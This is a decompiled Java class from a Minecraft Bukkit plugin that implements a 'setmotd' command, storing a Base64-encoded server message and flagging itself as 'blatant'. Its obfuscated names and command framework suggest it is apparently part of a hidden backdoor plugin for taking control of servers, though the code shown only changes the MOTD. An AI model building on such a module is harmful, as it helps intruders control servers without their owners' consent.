/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl;

import java.util.Base64;
import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class SetmotdCommand
extends Command {
    @Override
    public void execute(Core llllllllllllllllllIIIlIllIIIIIll, String llllllllllllllllllIIIlIllIIIIIlI, String[] llllllllllllllllllIIIlIlIlllllll, Player llllllllllllllllllIIIlIlIllllllI) {
        if (llllllllllllllllllIIIlIlIlllllll.length <= 1) {
            llllllllllllllllllIIIlIlIllllllI.sendMessage(Settings.USAGE("setmotd <message>"));
        } else {
            StringBuilder llllllllllllllllllIIIlIllIIIIllI = new StringBuilder();
            for (int llllllllllllllllllIIIlIllIIIIlll = 1; llllllllllllllllllIIIlIllIIIIlll != llllllllllllllllllIIIlIlIlllllll.length; ++llllllllllllllllllIIIlIllIIIIlll) {
                llllllllllllllllllIIIlIllIIIIllI.append(llllllllllllllllllIIIlIlIlllllll[llllllllllllllllllIIIlIllIIIIlll]).append(" ");
            }
            byte[] llllllllllllllllllIIIlIllIIIIlIl = Base64.getEncoder().encode(String.valueOf(llllllllllllllllllIIIlIllIIIIllI).getBytes());
            DataManager.getData().set("mt", (Object)new String(llllllllllllllllllIIIlIllIIIIlIl));
            DataManager.saveData();
            llllllllllllllllllIIIlIlIllllllI.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The new MOTD is ").append(Settings.RED).append((Object)llllllllllllllllllIIIlIllIIIIllI))));
        }
    }

    public SetmotdCommand() {
        SetmotdCommand llllllllllllllllllIIIlIllIIIllIl;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

